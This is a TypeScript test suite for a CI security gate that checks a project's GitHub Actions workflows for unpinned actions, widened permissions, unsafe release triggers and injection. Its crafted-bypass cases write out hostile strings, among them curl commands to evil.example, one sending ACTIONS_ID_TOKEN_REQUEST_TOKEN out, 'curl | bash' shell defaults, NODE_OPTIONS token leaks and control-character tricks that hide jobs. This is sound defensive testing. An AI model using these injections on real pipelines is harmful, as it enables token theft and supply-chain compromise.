import { spawnSync } from 'node:child_process';
import { mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { afterEach, describe, expect, it } from 'vitest';

const script = new URL('../../../scripts/check-workflows.mjs', import.meta.url).pathname;
const real = (f: string) => readFileSync(new URL(`../../../.github/workflows/${f}`, import.meta.url), 'utf8');
const dirs: string[] = [];

function run(files: Record<string, string>) {
  const d = mkdtempSync(join(tmpdir(), 'wfchk-'));
  dirs.push(d);
  for (const [name, text] of Object.entries(files)) writeFileSync(join(d, name), text);
  const r = spawnSync(process.execPath, [script, d], { encoding: 'utf8' });
  return { code: r.status, err: r.stderr };
}

afterEach(() => { while (dirs.length) rmSync(dirs.pop()!, { recursive: true, force: true }); });

describe('check-workflows gate', () => {
  it('accepts the real workflows', () => {
    const r = spawnSync(process.execPath, [script], { encoding: 'utf8' });
    expect(r.status).toBe(0);
  });
  it('rejects an action pinned to a tag', () => {
    const r = run({ 'ci.yml': real('ci.yml').replace(/actions\/checkout@[0-9a-f]{40}/, 'actions/checkout@v4') });
    expect(r.code).toBe(1);
    expect(r.err).toMatch(/not pinned to a commit SHA/);
  });
  it('rejects pull_request_target', () => expect(run({ 'ci.yml': real('ci.yml').replace('pull_request:', 'pull_request_target:') }).code).toBe(1));
  it('rejects a missing or widened permissions block', () => {
    expect(run({ 'ci.yml': real('ci.yml').replace('permissions:\n  contents: read\n', '') }).code).toBe(1);
    expect(run({ 'ci.yml': real('ci.yml').replace('permissions:\n  contents: read\n', 'permissions:\n  contents: write\n') }).code).toBe(1);
  });
  it('rejects a checkout that keeps credentials', () => {
    expect(run({ 'ci.yml': real('ci.yml').replace('persist-credentials: false', 'persist-credentials: true') }).code).toBe(1);
    expect(run({ 'ci.yml': real('ci.yml').replace(/\n {10}persist-credentials: false/g, '') }).code).toBe(1);
  });
  it('rejects id-token outside a release workflow', () => {
    expect(run({ 'ci.yml': real('ci.yml').replace('jobs:\n', 'jobs:\n  x:\n    permissions:\n      id-token: write\n    runs-on: ubuntu-latest\n    steps: []\n') }).code).toBe(1);
  });
  it.each(['push', 'schedule', 'release', 'pull_request', 'workflow_run'])('rejects a release workflow that also triggers on %s', (t) => {
    const text = real('release-npm.yml').replace('on:\n  workflow_dispatch:\n', `on:\n  workflow_dispatch:\n  ${t}:\n`);
    const r = run({ 'release-npm.yml': text });
    expect(r.code).toBe(1);
    expect(r.err).toMatch(/only on workflow_dispatch/);
  });
  it('rejects a release workflow that is not on workflow_dispatch at all, or has no environment', () => {
    expect(run({ 'release-npm.yml': real('release-npm.yml').replace('workflow_dispatch:', 'push:') }).code).toBe(1);
    expect(run({ 'release-pypi.yml': real('release-pypi.yml').replace(/ {4}environment: .*\n/, '') }).code).toBe(1);
  });
  it('rejects attacker-controlled context in an expression', () => {
    expect(run({ 'ci.yml': real('ci.yml').replace('- run: npm test', '- run: echo "${{ github.event.pull_request.title }}"') }).code).toBe(1);
  });

  // Two crafted files that once slipped past an earlier version of the gate: a widened top-level block that still starts with contents: read, and a
  // write scope the old fixed list did not name.
  it('rejects a top-level permissions block with an extra scope after contents: read', () => {
    const r = run({ 'ci.yml': real('ci.yml').replace('permissions:\n  contents: read\n', 'permissions:\n  contents: read\n  packages: write\n') });
    expect(r.code).toBe(1);
    expect(r.err).toMatch(/top-level permissions block must be exactly contents: read/);
    expect(run({ 'ci.yml': real('ci.yml').replace('permissions:\n  contents: read\n', 'permissions:\n  contents: read\n  actions: read\n') }).code).toBe(1);
    expect(run({ 'release-npm.yml': real('release-npm.yml').replace('permissions:\n  contents: read\n', 'permissions:\n  contents: read\n  id-token: write\n') }).code).toBe(1);
    expect(run({ 'ci.yml': real('ci.yml').replace('permissions:\n  contents: read\n', 'permissions: read-all\n') }).code).toBe(1);
  });
  it.each(['security-events', 'attestations', 'pages', 'discussions', 'repository-projects'])('rejects %s: write in any job', (scope) => {
    const text = real('ci.yml').replace('jobs:\n', `jobs:\n  x:\n    permissions:\n      ${scope}: write\n    runs-on: ubuntu-latest\n    steps: []\n`);
    const r = run({ 'ci.yml': text });
    expect(r.code).toBe(1);
    expect(r.err).toMatch(new RegExp(`${scope}: write is not allowed`));
  });
  it('reads only the first-level keys under on: as triggers', () => {
    const inputs = 'on:\n  workflow_dispatch:\n    inputs:\n      dry-run:\n        type: boolean\n';
    expect(run({ 'release-npm.yml': real('release-npm.yml').replace('on:\n  workflow_dispatch:\n', inputs) }).code).toBe(0);
    const r = run({ 'release-npm.yml': real('release-npm.yml').replace('on:\n  workflow_dispatch:\n', `${inputs}  push:\n`) });
    expect(r.code).toBe(1);
    expect(r.err).toMatch(/found: workflow_dispatch, push/);
  });
  it.each([
    '${{ github.event.workflow_run.head_branch }}',
    '${{ github.event.discussion.title }}',
    '${{ github.event.review_comment.body }}',
    '${{ github.head_ref }}',
    '${{ inputs.version }}',
    '${{ github.event.inputs.version }}',
    '${{ toJSON(github.event) }}',
  ])('rejects %s in an expression', (expr) => {
    expect(run({ 'ci.yml': real('ci.yml').replace('- run: npm test', `- run: echo "${expr}"`) }).code).toBe(1);
  });

  describe('release workflows: build and publish jobs', () => {
    const npm = () => real('release-npm.yml');
    const pypi = () => real('release-pypi.yml');
    const publishStep = '      - run: npm publish pkg/mercurifi-sdk-*.tgz --provenance --access public --ignore-scripts\n';
    it.each([
      ['an install step', publishStep.replace('npm publish', 'npm ci && npm publish')],
      ['a chained command', publishStep.replace('--ignore-scripts', '--ignore-scripts; curl https://evil.example')],
      ['a command hidden after a quoted hash', publishStep.replace('--ignore-scripts', '--ignore-scripts "#" ; curl x')],
      ['a test run', `${publishStep}      - run: npm test\n`],
      ['a multi-line run', `${publishStep}      - run: |\n          npm publish x.tgz\n          node -e "1"\n`],
      ['a cache action', `      - uses: actions/cache@0c45773b623bea8c8e75f6c82b208c3cf94ea4f9 # v4.0.2\n${publishStep}`],
      ['a step env', `${publishStep}        env:\n          NODE_OPTIONS: --require ./x.js\n`],
    ])('refuses %s in the npm publish job', (_, step) => {
      const r = run({ 'release-npm.yml': npm().replace(publishStep, step) });
      expect(r.code).toBe(1);
      expect(r.err).toMatch(/publish job/);
    });
    it('refuses a dependency cache on setup-node in the publish job', () => {
      const r = run({ 'release-npm.yml': npm().replace("          node-version: '24'\n", "          node-version: '24'\n          cache: npm\n") });
      expect(r.code).toBe(1);
      expect(r.err).toMatch(/no dependency cache/);
    });
    it('refuses checkout-and-build in the PyPI publish job', () => {
      const text = pypi().replace('      - uses: pypa/gh-action-pypi-publish', '      - run: uv build\n      - uses: pypa/gh-action-pypi-publish');
      expect(run({ 'release-pypi.yml': text }).code).toBe(1);
    });
    it('refuses a publish job without needs, environment or a publish step', () => {
      expect(run({ 'release-npm.yml': npm().replace('    needs: build\n', '') }).err).toMatch(/must need the build job/);
      expect(run({ 'release-pypi.yml': pypi().replace('    environment: pypi-release\n', '') }).err).toMatch(/protected environment/);
      expect(run({ 'release-npm.yml': npm().replace(publishStep, '') }).err).toMatch(/no publish step/);
    });
    it('refuses job keys that change what the publish job runs', () => {
      expect(run({ 'release-npm.yml': npm().replace('    environment: npm-release\n', '    environment: npm-release\n    container: node:24\n') }).err).toMatch(/container is not allowed/);
      expect(run({ 'release-npm.yml': npm().replace('    environment: npm-release\n', '    environment: npm-release\n    env:\n      X: y\n') }).err).toMatch(/env is not allowed/);
    });
    it.each(['github.repository_owner', 'github.actor', 'github.triggering_actor'])('requires %s in the publish guard', (ctx) => {
      const text = npm().replace(/(    if: .*)\n/, (_, line: string) => `${line.replace(new RegExp(`( && )?${ctx.replace('.', '\\.')} == '[^']*'`), '')}\n`);
      expect(text).not.toBe(npm());
      const r = run({ 'release-npm.yml': text });
      expect(r.code).toBe(1);
      expect(r.err).toMatch(new RegExp(`must require ${ctx.replace('.', '\\.')}`));
    });
    it('refuses an || in the publish guard', () => {
      expect(run({ 'release-npm.yml': npm().replace("github.triggering_actor == 'mercurifinance'", "github.triggering_actor == 'mercurifinance' || true") }).code).toBe(1);
    });
    it('refuses id-token or an environment on the build job', () => {
      const idToken = npm().replace('      contents: read\n    defaults:', '      contents: read\n      id-token: write\n    defaults:');
      expect(idToken).not.toBe(npm());
      expect(run({ 'release-npm.yml': idToken }).code).toBe(1);
      const env = pypi().replace('  build:\n', '  build:\n    environment: pypi-release\n');
      expect(run({ 'release-pypi.yml': env }).err).toMatch(/only the publish job/);
    });
    it('refuses a release job without its own permissions', () => {
      expect(run({ 'release-pypi.yml': pypi().replace('    permissions:\n      contents: read\n    defaults:', '    defaults:') }).err).toMatch(/set their own permissions/);
    });
  });

  // Crafted bypasses, set 1 (cases A to Q), each refused, plus near variants.
  describe('crafted bypasses (set 1)', () => {
    const base = () => real('release-npm.yml');
    const ci = () => real('ci.yml');
    const PUB = '      - run: npm publish pkg/mercurifi-sdk-*.tgz --provenance --access public --ignore-scripts\n';
    const G = "    if: github.repository_owner == 'mercuri-finance' && github.actor == 'mercurifinance' && github.triggering_actor == 'mercurifinance'\n";
    const swap = (text: string, a: string, b: string) => {
      expect(text.includes(a)).toBe(true);
      return text.replace(a, b);
    };
    const cases: [string, 'release-npm.yml' | 'release-pypi.yml' | 'ci.yml', () => string, RegExp][] = [
      ['A plain run continued on a deeper line', 'release-npm.yml', () => swap(base(), PUB, '      - run: npm publish pkg/mercurifi-sdk-*.tgz --provenance\n          ; curl -d @$ACTIONS_ID_TOKEN_REQUEST_TOKEN evil.example\n'), /continued on deeper-indented lines/],
      ['B guard continued with || true', 'release-npm.yml', () => swap(base(), G, `${G}      || true\n`), /continued on deeper-indented lines/],
      ['C id-token at top level', 'release-npm.yml', () => swap(base(), 'permissions:\n  contents: read\n\njobs', 'permissions:\n  contents: read\n  id-token: write\n\njobs'), /exactly contents: read/],
      ['D an arbitrary action', 'release-npm.yml', () => swap(base(), PUB, `${PUB}      - uses: evil/action@0123456789012345678901234567890123456789 # v1.0.0\n`), /evil\/action is not allowed/],
      ['E a reusable-workflow job', 'release-npm.yml', () => `${base()}\n  publish2:\n    needs: build\n    uses: ./.github/workflows/x.yml\n    permissions:\n      id-token: write\n`, /uses is not allowed in a publish job/],
      ['F an extra line in a run block', 'release-npm.yml', () => swap(base(), PUB, '      - run: |\n          npm publish pkg/x.tgz\n          curl evil\n'), /single-line npm publish/],
      ['G download-artifact from another run', 'release-npm.yml', () => swap(base(), '          name: npm-package\n          path: pkg\n', '          name: npm-package\n          path: pkg\n          run-id: 123\n          repository: attacker/repo\n          github-token: ${{ github.token }}\n'), /with: run-id is not allowed/],
      ['H checkout and publish the source directory', 'release-npm.yml', () => swap(base(), PUB, '      - uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4.4.0\n        with:\n          persist-credentials: false\n      - run: npm publish packages/typescript --provenance\n'), /actions\/checkout is not allowed in a publish job/],
      ['I a multi-line flow job with contents: write', 'ci.yml', () => `${ci()}\n  evil: { runs-on: ubuntu-latest, permissions: {\n      contents: write }, steps: [ { run: echo } ] }\n`, /flow collection must open and close on one line/],
      ['J a multi-line flow job with id-token: write', 'ci.yml', () => `${ci()}\n  evil: { runs-on: ubuntu-latest, permissions: {\n      id-token: write }, steps: [ { run: echo } ] }\n`, /flow collection must open and close on one line/],
      ['K an anchored step', 'release-npm.yml', () => swap(base(), '    steps:\n      - uses: actions/download', '    steps:\n      - &x\n        uses: actions/download'), /anchors, aliases and tags/],
      ['L a release environment on a CI job', 'ci.yml', () => `${ci()}\n  evil:\n    runs-on: ubuntu-latest\n    environment: npm-release\n    steps:\n      - run: echo\n`, /only the publish job/],
      ['M a folded run', 'release-npm.yml', () => swap(base(), PUB, '      - run: >-\n          npm publish pkg/x.tgz\n          --access public\n'), /single-line npm publish/],
      ['N a foreign registry', 'release-npm.yml', () => swap(base(), "          registry-url: 'https://registry.npmjs.org'\n", "          registry-url: 'https://evil.example'\n"), /registry-url must be https:\/\/registry\.npmjs\.org/],
      ['O a folded permission level', 'ci.yml', () => `${ci()}\n  evil:\n    runs-on: ubuntu-latest\n    permissions:\n      contents: >-\n        write\n    steps:\n      - run: echo\n`, /is not a permission level/],
      ['P quoted job and scope names', 'ci.yml', () => `${ci()}\n  'evil':\n    runs-on: ubuntu-latest\n    permissions:\n      "id-token": write\n    steps:\n      - run: echo\n`, /id-token: write belongs only/],
      ['Q a duplicate run key', 'release-npm.yml', () => swap(base(), PUB, PUB.replace('      - run: npm publish', '      - run: npm publish pkg/x.tgz\n        run: curl evil\n        name: x\n      - run: npm publish')), /duplicate key run/],
      // Near variants.
      ['a double-quoted run continued on a deeper line', 'release-npm.yml', () => swap(base(), PUB, '      - run: "npm publish pkg/x.tgz --provenance --access public --ignore-scripts\n          ; curl evil"\n'), /quoted scalar must close on its line/],
      ['a plain build-job run continued on a deeper line', 'ci.yml', () => swap(ci(), '      - run: npm test\n', '      - run: npm test\n          && curl evil\n'), /continued on deeper-indented lines/],
      ['a single-line flow job', 'ci.yml', () => `${ci()}\n  evil: { runs-on: ubuntu-latest, steps: [ { run: echo } ] }\n`, /write each job as a block mapping/],
      ['flow-style jobs', 'ci.yml', () => ci().replace(/\njobs:\n[\s\S]*$/, '\njobs: { evil: { runs-on: ubuntu-latest } }\n'), /write jobs as a block mapping/],
      ['flow-style job permissions', 'ci.yml', () => `${ci()}\n  evil:\n    runs-on: ubuntu-latest\n    permissions: { contents: read }\n    steps:\n      - run: echo\n`, /permissions must be a block of scopes/],
      ['an alias', 'release-npm.yml', () => swap(base(), "          node-version: '24'\n", '          node-version: *v\n'), /anchors, aliases and tags/],
      ['a merge key', 'release-npm.yml', () => swap(base(), '          name: npm-package\n', '          name: npm-package\n          <<: {}\n'), /merge keys are not allowed/],
      ['a flow with: in the publish job', 'release-npm.yml', () => swap(base(), '        with:\n          name: npm-package\n          path: pkg\n', '        with: { name: npm-package, path: pkg, run-id: 1 }\n'), /with: as a block mapping/],
      ['an extra setup-node input', 'release-npm.yml', () => swap(base(), "          node-version: '24'\n", "          node-version: '24'\n          always-auth: true\n"), /with: always-auth is not allowed/],
      ['a PyPI repository-url', 'release-pypi.yml', () => swap(real('release-pypi.yml'), '          packages-dir: dist/\n', '          packages-dir: dist/\n          repository-url: https://evil.example/legacy/\n'), /repository-url is not allowed/],
      ['a PyPI password input', 'release-pypi.yml', () => swap(real('release-pypi.yml'), '          packages-dir: dist/\n', '          packages-dir: dist/\n          password: x\n'), /with: password is not allowed/],
      ['npm publish without --ignore-scripts', 'release-npm.yml', () => swap(base(), PUB, PUB.replace(' --ignore-scripts', '')), /npm publish <tarball>\.tgz/],
      ['npm publish of a directory', 'release-npm.yml', () => swap(base(), PUB, PUB.replace('pkg/mercurifi-sdk-*.tgz', 'pkg')), /npm publish <tarball>\.tgz/],
      ['npm publish of a path with ..', 'release-npm.yml', () => swap(base(), PUB, PUB.replace('pkg/mercurifi-sdk-*.tgz', 'pkg/../x.tgz')), /npm publish <tarball>\.tgz/],
      ['npm publish to another registry', 'release-npm.yml', () => swap(base(), PUB, PUB.replace(' --ignore-scripts', ' --ignore-scripts --registry=https://evil.example')), /npm publish <tarball>\.tgz/],
    ];
    it.each(cases)('refuses %s', (_, file, make, why) => {
      const r = run({ [file]: make() });
      expect(r.code).toBe(1);
      expect(r.err).toMatch(why);
    });
  });

  // Crafted bypasses, set 2 (R1 to R29 and S1 to S4).
  describe('crafted bypasses (set 2)', () => {
    const base = () => real('release-npm.yml');
    const ci = () => real('ci.yml');
    const PUB = '      - run: npm publish pkg/mercurifi-sdk-*.tgz --provenance --access public --ignore-scripts\n';
    const G = "    if: github.repository_owner == 'mercuri-finance' && github.actor == 'mercurifinance' && github.triggering_actor == 'mercurifinance'\n";
    const TOP = 'permissions:\n  contents: read\n\njobs';
    const LAST = '          echo "$RUNNER_TEMP/ci/bin" >> "$GITHUB_PATH"\n';
    const swap = (text: string, a: string, b: string) => {
      expect(text.includes(a)).toBe(true);
      return text.replace(a, b);
    };
    const hidden = (br: string) => {
      const job = ['', '  steal:', '    name: s', '    needs: build', '    runs-on: ubuntu-latest', '    environment: npm-release', '    permissions:', '      id-token: write', '    steps:', '      - run: curl -s evil.example'].join(br);
      return swap(base(), LAST, `${LAST.trimEnd()}${job}\n`);
    };
    const BYTES = /only printable ASCII, spaces and \\n are allowed/;
    const cases: [string, 'release-npm.yml' | 'ci.yml', () => string, RegExp][] = [
      ['R1 a comment after the publish line', 'release-npm.yml', () => swap(base(), PUB, `${PUB.trimEnd()} # ; curl evil\n`), /npm publish <tarball>\.tgz/],
      ['R2 a comment between continuation lines', 'release-npm.yml', () => swap(base(), PUB, `${PUB}          # hi\n          ; curl evil\n`), /continued on deeper-indented lines/],
      ['R3 CRLF line endings', 'release-npm.yml', () => base().replace(/\n/g, '\r\n'), /CRLF line endings are not allowed/],
      ['R4 a lone CR in the publish run', 'release-npm.yml', () => swap(base(), PUB, `${PUB.trimEnd()}\r          ; curl evil\n`), /U\+000D/],
      ['R5 a lone CR in the guard', 'release-npm.yml', () => swap(base(), G, `${G.trimEnd()}\r      || true\n`), /U\+000D/],
      ['R6 a lone CR hiding id-token in CI', 'ci.yml', () => swap(ci(), '  python:\n    name: Python\n', '  python:\n    name: Python\r    permissions:\r      id-token: write\n'), /U\+000D/],
      ['R7 a lone CR hiding contents: write in CI', 'ci.yml', () => swap(ci(), '  python:\n    name: Python\n', '  python:\n    name: Python\r    permissions:\r      contents: write\n'), /U\+000D/],
      ['R8 a zero-width space in a key', 'release-npm.yml', () => swap(base(), '    steps:\n      - uses: actions/download', '    steps\u200b:\n      - uses: actions/download'), /U\+200B/],
      ['R9 a trailing NBSP on the publish line', 'release-npm.yml', () => swap(base(), PUB, `${PUB.trimEnd()}\u00a0\n`), /U\+00A0/],
      ['R10 a top-level env (NODE_OPTIONS)', 'release-npm.yml', () => swap(base(), TOP, `env:\n  NODE_OPTIONS: --import=data:text/javascript,console.log(process.env.ACTIONS_ID_TOKEN_REQUEST_TOKEN)\n\n${TOP}`), /top-level env is not allowed/],
      ['R11 top-level defaults (shell)', 'release-npm.yml', () => swap(base(), TOP, `defaults:\n  run:\n    shell: curl -s evil.example | bash; bash -e {0}\n\n${TOP}`), /top-level defaults is not allowed/],
      ['R12 a publish job env', 'release-npm.yml', () => swap(base(), '    environment: npm-release\n', '    environment: npm-release\n    env:\n      BASH_ENV: x\n'), /env is not allowed in a publish job/],
      ['R13 publish job defaults', 'release-npm.yml', () => swap(base(), '    environment: npm-release\n', "    environment: npm-release\n    defaults:\n      run:\n        shell: bash -c 'curl x; bash {0}'\n"), /defaults is not allowed in a publish job/],
      ['R14 a step working-directory', 'release-npm.yml', () => swap(base(), PUB, PUB.replace('      - run:', '      - working-directory: /tmp\n        run:')), /step key working-directory/],
      ['R15 continue-on-error', 'release-npm.yml', () => swap(base(), PUB, `${PUB}        continue-on-error: true\n`), /step key continue-on-error/],
      ['R16 always() in the guard', 'release-npm.yml', () => swap(base(), G, G.replace('if: ', 'if: always() && ')), /if: must be exactly/],
      ['R17 the guard wrapped in an expression', 'release-npm.yml', () => swap(base(), G, `    if: \${{ ${G.trim().slice(4)} }}\n`), /if: must be exactly/],
      ['R18 a self-hosted runner', 'release-npm.yml', () => swap(base(), '    runs-on: ubuntu-latest\n    timeout-minutes: 15', '    runs-on: self-hosted\n    timeout-minutes: 15'), /runs on ubuntu-latest/],
      ['R19 an absolute download path', 'release-npm.yml', () => swap(base(), '          path: pkg\n', '          path: /home/runner\n'), /download path must be relative/],
      ['R21 an absolute tarball path', 'release-npm.yml', () => swap(base(), PUB, '      - run: npm publish /tmp/x.tgz --provenance --access public --ignore-scripts\n'), /npm publish <tarball>\.tgz/],
      ['R25 a U+2028 in the publish run', 'release-npm.yml', () => swap(base(), PUB, `${PUB.trimEnd()}\u2028          ; curl evil\n`), /U\+2028/],
      ['R26 a top-level env (npm config)', 'release-npm.yml', () => swap(base(), TOP, `env:\n  npm_config_ignore_scripts: 'false'\n  npm_config_provenance: 'false'\n\n${TOP}`), /top-level env is not allowed/],
      ['R29 a job key differing only by case', 'ci.yml', () => swap(ci(), '  python:\n    name: Python\n', '  python:\n    name: Python\n    Permissions:\n      id-token: write\n'), /Permissions differs from the key permissions only by case/],
      ['S1 a CR hiding a job in a run block', 'release-npm.yml', () => hidden('\r'), /U\+000D/],
      ['S2 a NEL hiding a job in a run block', 'release-npm.yml', () => hidden('\x85'), /U\+0085/],
      ['S3 a U+2028 hiding a job in a run block', 'release-npm.yml', () => hidden('\u2028'), /U\+2028/],
      ['S4 a NEL hiding a publish job env', 'release-npm.yml', () => swap(base(), '    timeout-minutes: 15\n', '    timeout-minutes: 15\x85    env:\x85      NODE_OPTIONS: --import=data:text/javascript,1\n'), /U\+0085/],
      // Near variants of the byte rule and the new publish-job rules.
      ['a U+2029', 'ci.yml', () => swap(ci(), '      - run: npm test\n', '      - run: npm test\u2029      - run: curl evil\n'), /U\+2029/],
      ['a BOM', 'ci.yml', () => `\ufeff${ci()}`, /U\+FEFF/],
      ['a tab', 'ci.yml', () => swap(ci(), '      - run: npm test\n', '      - run: npm test\t\n'), /U\+0009/],
      ['a top-level key outside the allowlist', 'ci.yml', () => swap(ci(), '\njobs:\n', '\nx-extra: 1\n\njobs:\n'), /top-level x-extra is not allowed/],
      ['a top-level key differing only by case', 'release-npm.yml', () => swap(base(), TOP, `Env:\n  X: y\n\n${TOP}`), /Env differs from the key env only by case/],
      ['success() in the guard', 'release-npm.yml', () => swap(base(), G, G.replace("'mercurifinance'\n", "'mercurifinance' && success()\n")), /if: must be exactly/],
      ['a fourth guard clause', 'release-npm.yml', () => swap(base(), G, G.replace("'mercurifinance'\n", "'mercurifinance' && github.ref == 'refs/heads/main'\n")), /if: must be exactly/],
      ['a runs-on list', 'release-npm.yml', () => swap(base(), '    runs-on: ubuntu-latest\n    timeout-minutes: 15', '    runs-on: [self-hosted, ubuntu-latest]\n    timeout-minutes: 15'), /runs on ubuntu-latest/],
      ['a download path with ..', 'release-npm.yml', () => swap(base(), '          path: pkg\n', '          path: pkg/../..\n'), /download path must be relative/],
      ['a download path under ~', 'release-npm.yml', () => swap(base(), '          path: pkg\n', '          path: ~/x\n'), /download path must be relative/],
      ['a download path from an expression', 'release-npm.yml', () => swap(base(), '          path: pkg\n', '          path: ${{ runner.temp }}\n'), /download path must be relative/],
    ];
    it.each(cases)('refuses %s', (_, file, make, why) => {
      const r = run({ [file]: make() });
      expect(r.code).toBe(1);
      expect(r.err).toMatch(why);
    });
    it('names CRLF instead of crashing, for every workflow file it reads', () => {
      const r = run({ 'ci.yml': ci(), 'release-npm.yml': base().replace(/\n/g, '\r\n'), 'release-pypi.yml': real('release-pypi.yml').replace('name: release-pypi\n', 'name: release-pypi\r# x\n') });
      expect(r.code).toBe(1);
      expect(r.err).toMatch(/release-npm\.yml: CRLF line endings are not allowed/);
      expect(r.err).toMatch(/release-pypi\.yml:1:\d+: .*U\+000D/);
      expect(r.err).not.toMatch(/TypeError/);
    });
    // Equivalent spellings the gate reads the same way GitHub does; accepted (they change nothing the job does).
    it.each([
      ['R22 a quoted steps key', () => swap(base(), '    steps:\n      - uses: actions/download', '    "steps":\n      - uses: actions/download')],
      ['R24 needs as a flow list', () => swap(base(), '    needs: build\n', '    needs: [build]\n')],
      ['R27 a concurrency block', () => swap(base(), '    environment: npm-release\n', '    environment: npm-release\n    concurrency:\n      group: x\n')],
      ['R28 a space before the run colon', () => swap(base(), PUB, PUB.replace('- run:', '- run :'))],
      ['the guard clauses in another order', () => swap(base(), G, "    if: github.triggering_actor == 'mercurifinance' && github.repository_owner == 'mercuri-finance' && github.actor == 'mercurifinance'\n")],
    ])('accepts %s', (_, make) => {
      expect(run({ 'release-npm.yml': make() }).code).toBe(0);
    });
  });

  it('runs the TypeScript suite on the .nvmrc Node version and on 24', () => {
    const nvmrc = readFileSync(new URL('../../../.nvmrc', import.meta.url), 'utf8').trim();
    const matrix = /node: \[([^\]]*)\]/.exec(real('ci.yml'))?.[1]?.split(',').map((v) => v.trim().replace(/'/g, ''));
    expect(matrix).toEqual([nvmrc, '24']);
  });
  it('pins every action with its exact tag in a comment', () => {
    for (const f of ['ci.yml', 'release-npm.yml', 'release-pypi.yml']) {
      for (const [line] of real(f).matchAll(/uses: .*$/gm)) expect(line).toMatch(/@[0-9a-f]{40} # v\d+\.\d+\.\d+$/);
    }
  });
});
